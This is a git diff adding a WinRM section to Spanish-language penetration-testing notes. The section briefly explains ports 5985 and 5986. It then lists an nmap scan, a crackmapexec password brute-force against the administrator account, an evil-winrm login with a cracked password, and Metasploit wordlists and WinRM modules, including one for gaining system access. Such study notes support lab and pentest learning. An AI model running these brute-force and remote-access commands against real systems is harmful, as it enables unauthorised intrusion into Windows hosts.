@@ -177,3 +177,30 @@ Lista de palabras para ataques de fuerza bruta
 ```python
 No hay en este caso
 ```
+
+### WinRm - 5985,5986 (this port no int common port 1000)
+WinRM (Windows Remote Management) es un protocolo desarrollado por Microsoft para la administración remota de sistemas Windows. Utiliza los puertos 5985 y 5986 para la comunicación no cifrada y cifrada, respectivamente. Estos puertos permiten la ejecución de comandos y la administración de sistemas Windows de forma remota, ofreciendo una alternativa a otros protocolos como SSH en entornos Windows.
+
+```python
+nmap -p5985,5986 IP
+crackmapexec winrm IP -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt (fuerza bruta pssword)
+evil-winrm.rb -u 'administrator' -p 'tinkerbell' -i IP (conectarnos remoto)
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+##### Metasploit
+Utilidades de la herramienta todo terreno carnal
+
+```python
+auxiliary/scanner/winrm/winrm_login
+auxiliary/scanner/winrm/winrm_cmd
+exploit/windows/winrm/winrm_script_exec (set FORCE_VBS true)
+use exploit/windows/winrm/winrm_script_exec (acceder al sistema)
+```
